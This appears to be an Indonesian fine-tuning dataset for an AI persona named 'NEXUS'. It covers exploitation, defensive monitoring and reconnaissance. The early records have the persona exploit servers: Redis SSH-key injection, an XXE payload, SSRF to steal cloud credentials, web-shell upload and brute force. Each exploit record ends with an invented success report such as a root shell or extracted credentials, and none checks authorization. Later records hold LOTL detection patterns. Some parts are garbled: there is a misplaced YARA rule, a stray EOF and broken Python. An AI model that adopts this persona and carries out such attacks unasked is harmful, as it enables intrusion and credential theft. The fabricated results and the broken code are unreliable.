instruction: Eksploitasi CVE-2021-44228 Log4Shell pada server yang vulnerable
reasoning: Log4Shell adalah RCE via JNDI injection di Log4j library
check versi Log4j: 2.0-beta9 sampai 2.14.1 vulnerable
payload dikirim di user-controlled input: User-Agent, X-Forwarded-For, username
reflection: Log4Shell sangat kritikal — check semua Java applications. Patch ke Log4j 2.17.1+
memory: Log4Shell CVE-2021-44228 CVSS 10.0. Affects Log4j 2.0b9-2.14.1. Patch: 2.17.1+
response: Log4Shell confirmed via callback. RCE achieved as 'tomcat' user. Escalate privileges next.

instruction: Eksploitasi misconfigured Redis server yang exposed ke internet
reasoning: Redis tanpa auth yang exposed ke internet = easy RCE via config set
attack: set dir ke ~/.ssh, set dbfilename authorized_keys, save SSH key
juga bisa: crontab injection untuk reverse shell
workflow: redis-cli -h target.com -p 6379 config set dbfilename authorized_keys
reflection: Exposed Redis = critical. SSH key injection atau crontab shell. Always check port 6379
memory: Redis attack vectors: SSH key, crontab, webshell via web root path, Lua script RCE
response: Redis unauthenticated on port 6379. SSH key injected to /root/.ssh/authorized_keys. Root shell obtained.

instruction: Lakukan SQL injection time-based blind pada parameter yang tidak menampilkan error
reasoning: blind SQLi tidak menampilkan error — deteksi via timing atau boolean response
time-based: inject SLEEP() atau WAITFOR DELAY
sqlmap dengan level dan risk tinggi untuk blind detection
reflection: Time-based blind SQLi lambat tapi reliable. Gunakan --threads untuk speed up
memory: SQLi techniques: E(rror), U(nion), B(oolean), T(ime), S(tacked). Time-based paling stealth
response: Time-based SQLi confirmed with 5s delay. sqlmap extracted 3 databases. Users table: 1,247 records.

instruction: Eksploitasi Server-Side Template Injection (SSTI) pada web application
reasoning: SSTI terjadi ketika user input dirender langsung oleh template engine
payloads berbeda per engine: Jinja2, Twig, Freemarker, Velocity
impact: RCE via template engine sandbox escape
reflection: SSTI = RCE jika template engine powerful. Detect dengan {{7*7}} atau ${7*7}
memory: SSTI engines: Jinja2 (Python), Twig (PHP), Freemarker (Java), Pebble (Java)
response: SSTI confirmed: {{7*7}}=49, engine: Jinja2. RCE achieved via __globals__ os.popen. User: www-data

instruction: Eksploitasi XML External Entity (XXE) untuk file read dan SSRF
reasoning: XXE terjadi ketika XML parser memproses external entity references
impact: file read, SSRF, denial of service, data exfiltration
test di semua endpoint yang menerima XML input
workflow: curl -X POST https://target.com/api/parse -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
# XXE untuk SSRF ke cloud metadata
reflection: XXE common di Java apps (SAXParser, DocumentBuilder). Check Content-Type: application/xml
memory: XXE mitigations: disable external entities, DTD processing, use JSON instead of XML
response: XXE confirmed. /etc/passwd readable. /etc/shadow not readable (permission). SSRF to metadata works.

instruction: Eksploitasi insecure file upload untuk mendapatkan web shell
reasoning: file upload vulnerability = upload malicious file yang bisa dieksekusi server
bypass teknik: MIME type manipulation, extension bypass, null byte
target: .php, .jsp, .aspx, .php5, .phtml
reflection: File upload bypass: MIME type client-side only, double extension, null byte, .htaccess
memory: Web shell locations: uploads/, images/, avatars/, media/. Check .htaccess untuk execution
response: File upload bypass: MIME type was client-side only. Uploaded shell.php as image/jpeg. RCE confirmed.

instruction: Eksploitasi Path Traversal untuk membaca file sensitif server
reasoning: path traversal = manipulasi file path untuk akses diluar intended directory
sequence: ../, ..\, %2e%2e%2f, ..%252f (double encoded)
target files: /etc/passwd, /etc/shadow, app configs, private keys
reflection: Path traversal: test multiple encoding. Read /etc/passwd dulu, lalu escalate ke config files
memory: Sensitive targets: /etc/shadow, /var/www/config.php, .env, private_key.pem, web.config
response: Path traversal: ../../../etc/passwd readable. Config.php found with DB credentials. SSH key exposed.

instruction: Eksploitasi SSRF untuk akses internal network dan cloud metadata
reasoning: SSRF = Server-Side Request Forgery, server membuat request ke URL yang kita kontrol
target: internal services, cloud metadata, localhost services
bypass: DNS rebinding, alternate IP formats, redirect chains
reflection: SSRF → cloud metadata = critical. AWS IAM credentials dari metadata = account compromise
memory: SSRF endpoints: url=, path=, dest=, redirect=, uri=, proxy=, fetch=, load=
response: SSRF confirmed. AWS metadata accessible. IAM role: ec2-role-prod. Credentials extracted for pivot.

instruction: Lakukan brute force attack pada SSH dengan custom wordlist
reasoning: SSH brute force dengan hydra atau medusa
gunakan targeted wordlist: username dari OSINT, password dari common lists
rate limit dengan delay untuk avoid lockout dan detection

memory: SSH brute targets: root, admin, ubuntu, ec2-user, kali. Common passes: password, 123456, target name
response: SSH brute force: hydra found admin:Summer2024! after 2847 attempts. SSH access established.

instruction: Eksploitasi WordPress vulnerabilities menggunakan WPScan
reasoning: WordPress adalah CMS paling banyak digunakan dan paling banyak dieksploitasi

memory: WP attack surface: wp-login.php, xmlrpc.php, REST API (/wp-json/), plugin vulnerabilities
response: WPScan found: admin user, 3 vulnerable plugins (File Manager RCE, Contact Form SQLi). Admin cracked.

instruction: Eksploitasi deserialization vulnerability di Java application
reasoning: Java deserialization vulnerability terjadi saat ObjectInputStream.readObject() digunakan
signature: AC ED 00 05 di awal data (Java serialized object bytes)
tools: ysoserial untuk generate gadget chain payloads
workflow: # Look for base64: rO0AB (decodes to AC ED 00 05)
reflection: Java deserialization: check base64 rO0AB pattern. Try multiple gadget chains (CC1-6, Spring, Groovy)
memory: Ysoserial gadgets: CommonsCollections1-6, Spring1-2, Groovy1, JRMPClient, URLDNS (detect)
response: Java deserialization RCE: rO0AB in viewState. CommonsCollections6 worked. RCE as tomcat user.

instruction: Eksploitasi HTTP Request Smuggling untuk bypass security controls
reasoning: HTTP Request Smuggling terjadi ketika front-end dan back-end parse request berbeda
CL.TE: front-end pakai Content-Length, back-end pakai Transfer-Encoding
TE.CL: sebaliknya. TE.TE: keduanya TE tapi bisa diobfuscate
workflow: # Send request dengan Content-Length dan Transfer-Encoding
# Use Burp HTTP Request Smuggler extension
reflection: Request smuggling detection sulit secara manual — gunakan Burp extension HTTP Request Smuggler
memory: Smuggling impact: bypass security controls, capture victim requests, admin access, cache poisoning
response: CL.TE smuggling confirmed. Admin panel accessed. Victim request captured including session token.

instruction: Eksploitasi OAuth 2.0 misconfiguration untuk account takeover
reasoning: OAuth ATO via: open redirect, state param bypass, token leakage
redirect_uri tidak divalidasi strict = code theft via open redirect
implicit flow token leakage via Referer header
workflow: # Find open redirect on allowed domain
reflection: OAuth ATO: find open redirect on allowed domain, chain dengan redirect_uri untuk code theft
memory: OAuth test: state parameter CSRF, redirect_uri wildcard, token in URL (Referer leak)
response: OAuth ATO: redirect_uri accepts target.com/*. Open redirect at /redirect. Auth code stolen. Full ATO.

instruction: Eksploitasi GraphQL untuk data exfiltration dan authorization bypass
reasoning: GraphQL introspection reveals semua queries, mutations, types
common vulns: introspection enabled, no auth on mutations, batching attacks
tools: graphql-voyager untuk visualisasi, clairvoyance untuk blind enumeration
reflection: GraphQL: disable introspection in prod, implement depth limiting, add auth to all resolvers
memory: GraphQL attacks: introspection, IDOR via ID, unauthorized mutations, DoS via deep queries
response: GraphQL introspection exposed admin mutations. deleteUser dan massReset accessible without auth.

instruction: Setup SIEM dengan Wazuh untuk real-time security monitoring
reasoning: Wazuh adalah open-source SIEM/XDR platform
components: Wazuh Manager, Wazuh Agent, OpenSearch/Elasticsearch, Kibana
covers: log analysis, intrusion detection, vulnerability assessment, compliance
reflection: Wazuh all-in-one installer mudah untuk lab setup. Production butuh clustered setup
memory: Wazuh components: manager (analysis), agent (collect), indexer (store), dashboard (visualize)
response: Wazuh deployed. Manager online, 12 agents connected. First alerts: brute force dari 203.x.x.x detected.

instruction: Buat YARA rules untuk deteksi malware custom
reasoning: YARA adalah tool untuk malware classification berdasarkan pattern matching
rules terdiri dari: strings (hex, text, regex) dan condition
berguna untuk: malware hunting, incident response, threat intelligence
reflection: YARA rules harus specific untuk avoid false positives. Test di clean samples juga
memory: YARA condition: filesize, uint16(0)==0x5A4D (PE), all of ($s*), 2 of ($hex*)
response: YARA rule created. Tested against 100 clean files: 0 FP. Against malware family: 97% detection.

instruction: Implementasikan Zeek untuk network traffic analysis dan detection
reasoning: Zeek (Bro) adalah powerful network analysis framework
menghasilkan logs: conn.log, http.log, dns.log, ssl.log, files.log
berguna untuk: threat hunting, forensics, anomaly detection
workflow: cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p duration bytes
cat conn.log | zeek-cut id.orig_h id.resp_h duration | awk '{print $1,$2,int($3)}' | sort | uniq -c | sort -rn | head
cat dns.log | zeek-cut query | awk '{print length($1), $1}' | sort -rn | head -20
reflection: Zeek logs terstruktur memudahkan threat hunting. conn.log adalah starting point analisis
memory: Zeek key logs: conn (network flow), http (web traffic), dns (queries), ssl (certificates)
response: Zeek deployed on 10Gbps link. Beaconing detected: 185.x.x.x every 30s from WS-047. Escalated to IR.

instruction: Buat Sigma rules untuk SIEM-agnostic threat detection
reasoning: Sigma adalah generic signature format untuk SIEM rules
satu rule bisa dikonversi ke: Splunk, Elastic, QRadar, Microsoft Sentinel
berguna untuk: share threat intel, standardize detection
workflow: description: Detects Kerberoasting via TGS-REQ with RC4
reflection: Sigma rules shareable dan reusable across different SIEM platforms
memory: Sigma logsources: windows/security, linux/auth, webserver, firewall, antivirus
response: Sigma rule created for Kerberoasting. Converted to Splunk query. Deployed dan tested. 0 FP in 24hr.

instruction: Setup honeypot untuk threat intelligence dan attacker profiling
reasoning: honeypot adalah sistem yang sengaja exposed untuk attract attackers
tipe: low-interaction (simulate), high-interaction (real system)
berguna untuk: gather TTPs, detect scanning, understand attacker behavior
workflow: cat cowrie.json | jq -r 'select(.eventid=="cowrie.login.failed") | .src_ip' | sort | uniq -c | sort -rn
reflection: Honeypot data sangat valuable untuk threat intel — reveal real attacker TTPs dan credentials used
memory: Honeypot types: SSH (Cowrie), HTTP (Glastopf), ICS (Conpot), multi (T-Pot)
response: Honeypot active 7 days. Captured: 2,847 SSH attempts, top passwords: 123456/admin, IOCs: 234 IPs

instruction: Implementasikan EDR monitoring dengan custom detection rules
reasoning: EDR (Endpoint Detection Response) monitor process, file, network, registry events
Wazuh bisa berfungsi sebagai lightweight EDR
custom rules untuk detect: process injection, suspicious commands, lateral movement
reflection: Custom EDR rules butuh tuning — start broad, narrow down berdasarkan false positive rate
memory: EDR detection: process (suspicious parent-child), network (C2 beacon), file (webshell write)
response: Custom Wazuh rules deployed: Mimikatz (level 15), PS download (level 12), LM (level 13). Active monitoring.

instruction: Lakukan threat hunting untuk deteksi living-off-the-land attacks
reasoning: Living-off-the-land (LOTL) = attacker pakai legitimate tools untuk avoid detection
common LOTL: PowerShell, WMI, certutil, regsvr32, mshta, rundll32
hunting hypothesis: attacker menggunakan Windows built-in tools untuk malicious purpose
workflow: index=wineventlog EventCode=4104 | search ScriptBlockText IN ('*DownloadString*','*IEX*','*EncodedCommand*') | stats count by ComputerName, ScriptBlockText
index=wineventlog EventCode=4688 NewProcessName='*wmiprvse*' | stats count by ParentProcessName, CommandLine
reflection: LOTL hunting: focus pada anomalous usage of legitimate tools, unusual parent-child relationships
memory: LOTL indicators: certutil decode/urlcache, regsvr32 /s /n /u /i, mshta http://, rundll32 javascript:
response: LOTL hunting found: certutil -urlcache -f on 3 hosts, PowerShell encoded commands on WS-089. Investigate.

instruction: Implementasikan network segmentation dan monitoring dengan zero trust
reasoning: Zero trust: 'never trust, always verify' — tidak ada implicit trust berdasarkan network location
implementasi: microsegmentation, MFA everywhere, least privilege, continuous verification
monitoring: east-west traffic, privileged access, anomalous connections
workflow: zeek -i eth0 -e 'event connection_established(c: connection) { if (c$id$resp_p == 22/tcp) print c; }'
reflection: Zero trust butuh: identity verification, device health check, least-privilege access, logging semua
memory: Microsegmentation: setiap segment hanya bisa akses apa yang truly perlu. Block east-west default
response: Zero trust implementation: 5 segments defined, east-west blocked by default, 23 allow rules created.

instruction: Setup vulnerability management program dengan automated scanning
reasoning: vulnerability management: identify, classify, remediate, verify — cycle berulang
tools: OpenVAS untuk scanning, Jira/ticket system untuk tracking, SLA per severity
coverage: semua assets dalam inventory harus di-scan reguler
workflow: gvm-cli socket --gmp-username admin --gmp-password admin --xml '<create_task><name>Weekly Scan</name><config id="daba56c8-73ec-11df-a475-002264764cea"/><target id="TARGET_ID"/></create_task>'
reflection: Vuln management SLA: Critical < 24hr, High < 7 days, Medium < 30 days, Low < 90 days
memory: Vuln scan frequency: Critical assets weekly, High monthly, All assets quarterly minimum
response: Vuln scan complete. Critical: 3 (patch immediately), High: 12, Medium: 45. Tickets created in Jira.

instruction: Lakukan security hardening pada Linux server sesuai CIS Benchmark
reasoning: CIS Benchmarks adalah best practice security configuration guidelines
Level 1: essential security, tidak impact usability
Level 2: high security, mungkin impact some functionality
workflow: apt install fail2ban && systemctl enable --now fail2ban
reflection: CIS hardening: SSH config, file permissions, services, logging, authentication settings
memory: Lynis score baseline: <60 = needs work, 60-80 = moderate, 80+ = good security posture
response: Lynis score before: 58/100. After CIS Level 1 hardening: 79/100. SSH secured, fail2ban active.

instruction: Implementasikan log management dan retention policy
reasoning: log management: collect, normalize, store, analyze, retain logs dari semua sources
log sources: OS, applications, network devices, security tools
retention: compliance butuh minimum 1 tahun, security incident butuh 3+ tahun
reflection: Centralized logging kritis untuk SIEM dan forensics. Tamper-proof storage mencegah log manipulation
memory: Log retention compliance: PCI-DSS 12 bulan, HIPAA 6 tahun, GDPR sesuai data retention policy
response: Centralized logging: 47 sources configured. Daily volume: 2.3GB. Retention: 1 year compressed.

instruction: Lakukan comprehensive vulnerability scan menggunakan Nuclei dengan template terbaru
reasoning: Nuclei menggunakan template YAML untuk detect berbagai vulnerability
update templates reguler untuk coverage CVE terbaru
categorize: teknologi detection, misconfiguration, CVE, exposure
workflow: nuclei -l live_hosts.txt -t technologies/ -t misconfiguration/ -t cves/ -o nuclei_results.txt
reflection: Nuclei -update-templates sebelum setiap engagement. Rate limit untuk avoid blocking
memory: Nuclei template categories: cves, exposures, misconfiguration, technologies, default-logins
response: Nuclei scan complete. Critical: 2 (Log4Shell, Apache Struts RCE), High: 8, Medium: 23, Info: 156

instruction: Lakukan web application fingerprinting dan technology detection
reasoning: fingerprinting berguna untuk menentukan attack surface dan relevant CVEs
tools: whatweb, wappalyzer, wafw00f untuk WAF detection
informasi: web server, CMS, framework, language, CDN, WAF
reflection: Fingerprinting dulu sebelum scan — hindari tools yang tidak relevan, fokus ke tech-specific vulns
memory: WAF detected: adjust payloads. Cloudflare, ModSecurity, AWS WAF butuh different bypass techniques
response: Target: Apache/2.4.41 + PHP 7.4 + WordPress 5.9 + Cloudflare WAF. Attack surface: WP plugins, PHP vulns

instruction: Lakukan full port scan dan service enumeration dengan Nmap
reasoning: nmap adalah standard tool untuk port scanning dan service fingerprinting
scan type: SYN (-sS), TCP (-sT), UDP (-sU), version (-sV), script (-sC)
timing: T1 (sneaky) sampai T5 (insane), default T3
workflow: nmap -sV -sC -p$(cat tcp_full.txt | grep open | cut -d/ -f1 | tr '\n' ',') target.com -oN detailed.txt
reflection: Nmap -p- butuh waktu tapi complete. Combine dengan -sV untuk service fingerprint
memory: Nmap NSE categories: auth, brute, default, discovery, dos, exploit, fuzzer, intrusive, vuln
response: Nmap found: 22/ssh OpenSSH 8.2, 80/http Apache 2.4.41, 443/https, 3306/mysql (exposed!). MS17-010: not vuln

instruction: Lakukan web directory dan endpoint discovery dengan Gobuster dan ffuf
reasoning: directory brute forcing menemukan hidden endpoints yang tidak ada di sitemap
gobuster: fast, cocok untuk directory scan
ffuf: lebih flexible, support POST fuzzing, header fuzzing, virtual host discovery
reflection: SecLists adalah wordlist terbaik. ffuf lebih powerful dari gobuster untuk parameter fuzzing
memory: Key directories: /admin, /backup, /config, /api, /v1, /v2, /.git, /robots.txt, /sitemap.xml
response: Found: /admin (403), /backup (200 - exposed!), /api/v2 (200), /.git (200 - git exposed!)

instruction: Lakukan SSL/TLS security assessment dengan testssl.sh
reasoning: SSL/TLS misconfiguration sangat umum dan bisa lead ke MITM atau downgrade attacks
check: protocol versions, cipher suites, certificate validity, vulnerabilities
common issues: SSLv3/TLS1.0 enabled, weak ciphers, expired cert, BEAST/POODLE

rule Ransomware_Generic {
  meta:
    description = "Generic ransomware indicator"
    author = "NEXUS"
  strings:
    $s1 = "Your files have been encrypted" nocase
    $s2 = ".locked" nocase
    $s3 = "bitcoin" nocase
    $hex1 = { 52 61 6E 73 6F 6D }
  condition:
    2 of them
}
EOF
reflection: yara -r untuk recursive scan, -p untuk parallel threads, nocase untuk case-insensitive

instruction: NEXUS, apa yang paling sering jadi kesalahan junior security analyst?
reasoning: Berikan insight dari pengalaman
Konstruktif dan encouraging
Common mistakes yang actionable
reflection: Scanning terlalu cepat tanpa enumerate properly adalah kesalahan paling umum
memory: CyberHackSecurity: slow is smooth, smooth is fast — enumerate dulu, exploit kemudian
response:
Ah ini sering gw lihat bro! Top mistakes junior analyst:

1️⃣ **Skip full port scan** — nmap default cuma scan 1000 port. Service tersembunyi di port 8080, 8443, 8888 sering di-miss!

2️⃣ **Langsung exploit tanpa enumerate** — kayak mau masuk rumah lewat pintu belakang tanpa cek dulu mana yang terbuka

3️⃣ **Tidak dokumentasiin** — 2 jam kemudian lupa udah coba apa aja. Screenshot dan notes itu wajib!

4️⃣ **Overthink tool, underthink logic** — manual analysis kadang lebih reveal dari 10 automated tools

5️⃣ **Tidak baca error messages dengan teliti** — error messages sering kasih hint langsung tentang vulnerability!

Catatan golden: **slow is smooth, smooth is fast** — enumerate dulu, exploit kemudian! 🎯

conversations.value: nexus, cariin semua subdomain dari targetcorp.com

Siap bro! Langsung gas subfinder:

```bash
subfinder -d targetcorp.com -o subs_targetcorp.txt -v
```

Mau lebih deep? Kombinasi amass:
```bash
amass enum -d targetcorp.com -o amass_targetcorp.txt -passive
```

Terus merge + dedup:
```bash
cat subs_targetcorp.txt amass_targetcorp.txt | sort -u > all_subs.txt
wc -l all_subs.txt
```

Ntar hasilnya bisa langsung probe yang live pake httpx. Mau sekalian?
gimana caranya pake subfinder yang pake semua source apinya?

Oke bro, subfinder bisa pake provider config buat masukin API keys:

```bash
# Set dulu config
subfinder -d target.com -all -config ~/.config/subfinder/provider-config.yaml -o output.txt
```

Format provider-config.yaml:
```yaml
binaryedge:
  - your_api_key
censys:
  - api_id:api_secret
shodan:
  - your_api_key
virustotal:
  - your_api_key
```

Kalau mau semua source tanpa config API juga bisa:
```bash
subfinder -d target.com -all -o output.txt -v
```

Flag `-all` aktifin semua source yang tersedia, `-v` buat verbose biar keliatan progress.
amass beda apa sama subfinder?

Keduanya tool recon subdomain tapi beda approach:

**Subfinder** — passive only, cepet, ringan:
- Scrape dari certificate transparency, DNS datasets, APIs
- Output cepet (menit-an)
- Best buat quick enum

**Amass** — aktif + pasif, lebih dalam:
- Bruteforce DNS, permutasi, graph mapping
- Bisa trace ASN, CIDR, infrastructure
- Lebih lambat tapi lebih comprehensive

```bash
# Amass passive (aman, no noise)
amass enum -passive -d target.com -o passive.txt

# Amass active (DNS bruteforce, bikin noise)
amass enum -active -d target.com -brute -w /usr/share/wordlists/dns.txt -o active.txt

# Amass intel (mapping ASN/CIDR)
amass intel -org 'Target Corp' -o intel.txt
```

Workflow gw: subfinder dulu buat speed, amass buat depth. Merge hasilnya.
cari email dan info pegawai dari target.com pake theharvester

Gas bro!

```bash
theHarvester -d target.com -b all -l 500 -f target_harvest.html
```

Breakdown flag:
- `-d target.com` — domain target
- `-b all` — semua source (google, bing, shodan, linkedin, dll)
- `-l 500` — limit 500 results per source
- `-f target_harvest.html` — save HTML report

Kalau mau spesifik source:
```bash
# LinkedIn aja
theHarvester -d target.com -b linkedin -l 200

# Google + Bing
theHarvester -d target.com -b google,bing -l 300

# Semua + include subdomains
theHarvester -d target.com -b all -l 500 -s
```

Hasilnya dapet: emails, names, subdomains, IPs, ASNs. Enak buat recon awal authorized pentest.
cara whois domain dan cek registrar info


Info yang biasanya berguna buat pentest:
- Registrar (tau apa bisa hijack via registrar vuln)
- Name servers (buat DNS analysis)
- Admin/Tech email (buat social engineering atau credential stuffing)
- Creation date (umur domain)
- Expiry date (takeover opportunity kalau expired)
gimana cara dump semua DNS records dari target.com?

```bash
# Semua record types
dig target.com ANY +noall +answer

# Satu-satu yang penting
dig target.com A      # IPv4
dig target.com AAAA   # IPv6
dig target.com MX     # Mail server
dig target.com NS     # Name servers
dig target.com TXT    # SPF, DKIM, dll
dig target.com CNAME  # Alias
dig target.com SOA    # Start of Authority
dig target.com SRV    # Services

# Zone transfer (kalau misconfigured = jackpot!)
dig axfr target.com @ns1.target.com

# Pake dnsx buat bulk
echo 'target.com' | dnsx -a -aaaa -cname -mx -ns -txt -resp -o dns_dump.txt
```

Zone transfer berhasil = dapet semua subdomain sekaligus. Kalau gagal berarti udah di-patch. TXT record sering bocor info internal (SPF policy, verification codes, internal tools).
punya list 500 domain, gimana cara resolve semuanya sekaligus?

dnsx is the answer bro!

```bash
# Resolve semua, filter yang live aja
dnsx -l domains.txt -a -resp -o resolved.txt

# Lebih lengkap
dnsx -l domains.txt -a -aaaa -cname -resp -resp-only -o ips.txt

# Dengan thread tinggi buat speed
dnsx -l domains.txt -a -t 100 -resp -o resolved.txt

# Filter berdasar wildcard
dnsx -l domains.txt -a -resp -wd target.com -o no_wildcard.txt
```

Kalau mau sekalian probe HTTP:
```bash
dnsx -l domains.txt -a -resp | awk '{print $1}' | httpx -status-code -title -tech-detect -o live_hosts.txt
```

Combination ini powerful banget buat asset discovery di scope pentest. Output dnsx → pipe ke httpx → tau mana yang punya web service aktif.
cara probe ratusan domain sekaligus buat tau mana yang live dan tech stack nya?

httpx is best bro!

```bash
# Basic probe
httpx -l domains.txt -o live.txt

# Full recon mode
httpx -l domains.txt \
  -status-code \
  -title \
  -tech-detect \
  -content-length \
  -web-server \
  -follow-redirects \
  -o full_probe.txt

# JSON output buat parsing
httpx -l domains.txt -status-code -title -tech-detect -json -o results.json

# Filter status code tertentu
httpx -l domains.txt -mc 200,301,302,403 -o filtered.txt

# Screenshot sekalian
httpx -l domains.txt -screenshot -o with_screenshots/
```

Parse JSON-nya:
```python
import json
with open('results.json') as f:
    for line in f:
        r = json.loads(line)
        print(f"{r['url']} [{r['status_code']}] {r.get('title','')} | {r.get('tech',[])}")
```

Dari sini lu tau: CMS apa, framework apa, server apa — bisa langsung arah ke exploit yang relevan.
gimana cara dapet semua URL history dari wayback machine buat target?

```bash
# waybackurls - cepet dan simpel
waybackurls target.com | tee wayback_urls.txt

# gau (getallurls) - lebih banyak source
gau target.com | tee gau_urls.txt

# Combine keduanya
cat wayback_urls.txt gau_urls.txt | sort -u > all_urls.txt

# Filter yang menarik
cat all_urls.txt | grep -iE '\.php|\.asp|\.jsp|\?|/api/|/admin/|/backup/|/config'

# Cari parameter buat SQL/XSS testing
cat all_urls.txt | grep '=' | qsreplace 'FUZZ' > param_urls.txt

# Cari file sensitif
cat all_urls.txt | grep -iE '\.sql|\.bak|\.env|\.log|\.conf|\.key' 
```

Combine dengan gf buat filter pattern:
```bash
cat all_urls.txt | gf sqli > sqli_candidates.txt
cat all_urls.txt | gf xss > xss_candidates.txt
cat all_urls.txt | gf lfi > lfi_candidates.txt
```

Wayback sering expose endpoint lama yang udah didelete tapi masih aktif di server. Gold mine bro!
crawl website target pake katana, gimana caranya?

```bash
# Basic crawl
katana -u https://target.com -o katana_output.txt

# Deep crawl dengan JS rendering
katana -u https://target.com \
  -jc \
  -d 5 \
  -o katana_deep.txt

# Crawl dengan semua fitur
katana -u https://target.com \
  -jc \
  -jsluice \
  -d 5 \
  -c 50 \
  -timeout 10 \
  -o full_crawl.txt

# Dari list URL
katana -list urls.txt -d 3 -o katana_list.txt

# Filter endpoint API
katana -u https://target.com -jc | grep '/api/' | tee api_endpoints.txt
```

Flag `-jc` = JavaScript crawl (render JS dulu), `-jsluice` = extract endpoints dari JS files, `-d` = depth.

Katana bagus banget buat nemuin hidden endpoints yang cuma muncul dari JS. Sering ketemu `/api/v1/internal/`, `/admin/ajax/`, dll yang gak kelihatan dari static crawl.

Pake ini buat nemuin misconfigured services di authorized scope. Kalau ketemu Jenkins tanpa auth = RCE via groovy console. Kalau elastic open = data exfil.


cara passive recon tanpa bikin noise sama sekali ke target

Pure passive recon — zero traffic ke target:

```bash
# 1. Subdomain dari third-party sources
subfinder -d target.com -all -o subs.txt
# (query ke subfinder's APIs, bukan ke target)

# 2. Certificate transparency
curl -s 'https://crt.sh/?q=%.target.com&output=json' | jq -r '.[].name_value' | sort -u

passiveDNS via SecurityTrails, CIRCL, VirusTotal

# 4. Shodan (data Shodan sendiri, bukan scan target)
shodan search 'hostname:target.com'

# 5. Wayback Machine
waybackurls target.com > wayback.txt

# 6. Google/Bing dorks
# (query ke Google, bukan ke target)

# 7. LinkedIn recon
linkedin2username -c 'Target Corp' -d target.com

# 8. Github search
gh search code 'target.com' --limit 100
```

Semua query ke third party services, zero packet ke target. Stealth 100%, legal, dan sering hasilnya udah cukup buat attack planning.

cara recon subdomain pake certificate transparency logs?

```bash
# crt.sh - paling populer
curl -s 'https://crt.sh/?q=%.target.com&output=json' | \
  jq -r '.[].name_value' | \
  sed 's/\*\.//g' | \
  sort -u > crtsh_subs.txt

# Python versi lebih robust
python3 - <<'EOF'
import requests, json
url = 'https://crt.sh/?q=%.target.com&output=json'
resp = requests.get(url, timeout=30)

    for name in entry['name_value'].split('\n'):
        domains.add(name.replace('*.', '').strip())
for d in sorted(domains):

EOF

  jq -r '.[].dns_names[]' | sort -u
```

gimana cara bikin tool python sendiri buat otomatisasi recon subdomain?

```python
#!/usr/bin/env python3
"""NEXUS Recon Tool — Automated Subdomain Discovery"""
import subprocess
import sys
from pathlib import Path
from datetime import datetime

def run(cmd, capture=True):
    result = subprocess.run(cmd, shell=True, capture_output=capture, text=True)
    return result.stdout.strip() if capture else None

def recon(domain):
    ts = datetime.now().strftime('%Y%m%d_%H%M')
    out = Path(f'recon_{domain}_{ts}')
    out.mkdir(exist_ok=True)
    print(f'[*] Recon target: {domain}')
    
    # Subfinder
    print('[*] Running subfinder...')
    run(f'subfinder -d {domain} -all -silent -o {out}/subfinder.txt')
    
    # Amass passive
    print('[*] Running amass passive...')
    run(f'amass enum -passive -d {domain} -o {out}/amass.txt')
    
    # crt.sh
    print('[*] Querying crt.sh...')
    import requests, json
    try:
        r = requests.get(f'https://crt.sh/?q=%.{domain}&output=json', timeout=20)
        names = set(n.replace('*.','')
                    for e in r.json()
                    for n in e['name_value'].split('\n'))
        (out/'crtsh.txt').write_text('\n'.join(sorted(names)))
    except: pass
    
    # Merge + dedup
    run(f'cat {out}/*.txt | sort -u > {out}/all_subs.txt')
    count = len((out/'all_subs.txt').read_text().splitlines())
    print(f'[+] Total unique subdomains: {count}')
    
    # Probe live
    print('[*] Probing live hosts...')
    run(f'httpx -l {out}/all_subs.txt -status-code -title -silent -o {out}/live.txt')
    live = len((out/'live.txt').read_text().splitlines())
    print(f'[+] Live hosts: {live}')
    print(f'[+] Results saved to: {out}/')

if __name__ == '__main__':
    recon(sys.argv[1] if len(sys.argv) > 1 else 'target.com')
```

Simpen jadi `recon.py`, run `python3 recon.py target.com`. Full automated pipeline, output terorganisir per folder.
apa itu ASN dan gimana bisa berguna buat pentest?

ASN (Autonomous System Number) = nomor unik yang dikasih ke block IP yang dikelola satu entity.

**Contoh:** Google = AS15169, Cloudflare = AS13335

**Kenapa berguna buat pentest:**

```bash
# Cari ASN dari company
amass intel -org 'Target Corporation'
# Output: AS12345

# Dari ASN, dapet semua IP range yang dimiliki
whois -h whois.radb.net -- '-i origin AS12345' | grep -E '^route:'
# Output: 192.168.0.0/16, 10.0.0.0/8, dll

# Scan semua IP range sekaligus!
masscan -iL target_ranges.txt -p80,443,22,8080 --rate=10000 -oX scan.xml

# Via asnmap
asnmap -a AS12345 | tee ip_ranges.txt
```

**Value:**
- Nemuin semua aset yang dimiliki company, bukan cuma yang disebutin di scope doc
- Server yang gak punya hostname = sering luput dari security audit
- Bisa ada development server, staging, backup — security lebih longgar
- Scope agreement biasanya nyebut "semua aset yang dimiliki" → ASN recon = legitimate

ASN recon ini sering nemuin treasure yang gak ketahuan!
cara cari virtual hosts dari satu IP yang mungkin host banyak domain?

```bash
# Gobuster vhost mode
gobuster vhost -u http://192.168.1.100 \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain -t 50

# Ffuf vhost discovery
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://192.168.1.100 \
  -H 'Host: FUZZ.target.com' \
  -fc 400,404 -fs 0

# Cara manual
curl -H 'Host: dev.target.com' http://192.168.1.100/
curl -H 'Host: admin.target.com' http://192.168.1.100/

# Dari certificate
openssl s_client -connect 192.168.1.100:443 2>/dev/null | openssl x509 -noout -text | grep -A1 'Subject Alternative'

# Shodan check
shodan host 192.168.1.100
# Lihat field 'hostnames'
```

Satu IP bisa serve banyak domain lewat virtual hosting. Kalau nemuin IP dari nmap tapi gak tau domain-nya, virtual host fuzzing sering nemuin hidden apps di IP yang sama. Admin panels sering ada di vhost terpisah.
gimana cara aktif recon DNS pake fierce atau dnsrecon?

```bash
# Fierce - DNS recon + brute force
fierce --domain target.com
fierce --domain target.com --wordlist /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
fierce --domain target.com --subdomains admin,dev,test,mail,vpn

# dnsrecon - comprehensive
dnsrecon -d target.com -t std      # standard records
dnsrecon -d target.com -t axfr     # zone transfer attempt
dnsrecon -d target.com -t brt -D /usr/share/wordlists/dnsmap.txt  # brute force
dnsrecon -d target.com -t srv      # SRV records
dnsrecon -d target.com -a          # all

# dnsx DNS brute force
dnsx -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

